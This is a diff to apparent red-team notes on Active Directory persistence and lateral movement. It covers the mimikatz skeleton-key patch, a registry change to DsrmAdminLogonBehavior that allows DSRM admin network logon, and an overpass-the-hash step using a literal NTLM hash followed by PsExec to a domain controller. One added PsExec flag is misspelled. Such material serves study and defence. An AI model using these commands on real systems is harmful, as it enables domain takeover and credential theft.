@@ -259,7 +259,7 @@ mimikatz# misc::skeleton
 mimikatz# !-
 ```
 
-The DC can not be patched twice.
+> **The DC can not be patched twice.**
 
 ## Mitigation
 
@@ -310,20 +310,29 @@ Since we have the NTLM hash, we can pass the hash to authenticate. But, the Logo
 
 ```powershell
 Enter-PSSession -ComputerName dc01
-New-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2 -PropertyType DWORD
+[corp-dc]: PS C:\Users\Administrator\Documents> New-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD
+
+DsrmAdminLogonBehavior : 2
+PSPath                 : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\
+PSParentPath           : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control
+PSChildName            : Lsa
+PSDrive                : HKLM
+PSProvider             : Microsoft.PowerShell.Core\Registry
 ```
 
 > **Note**: If we get an error such as _"New-ItemProperty: The property already exists"_ you need to modify it.
 >
 > `Get-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\"`
-> `Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehaviour" -Value 2`
+> `Set-ItemProperty "HKLM:\System\CurrentControlSet\Control\Lsa\" -Name "DsrmAdminLogonBehavior" -Value 2`
 
 * Over PassTheHash
 
 ```powershell
 Invoke-Mimikatz -Command '"sekurlsa::pth /domain:dc01 /user:Administrator /ntlm:a9b30e5b0dc865eadcea9411e4ade72d /run:powershell.exe'
-ls \\dc01\c$
+
+PsExec.exe /accepeula \\dc01.corp.local powershell
 ```
+> **Note**: Is not possible to connect via `PSRemote`, so use `PsExec` instead.
 
 ## Mitigation
 
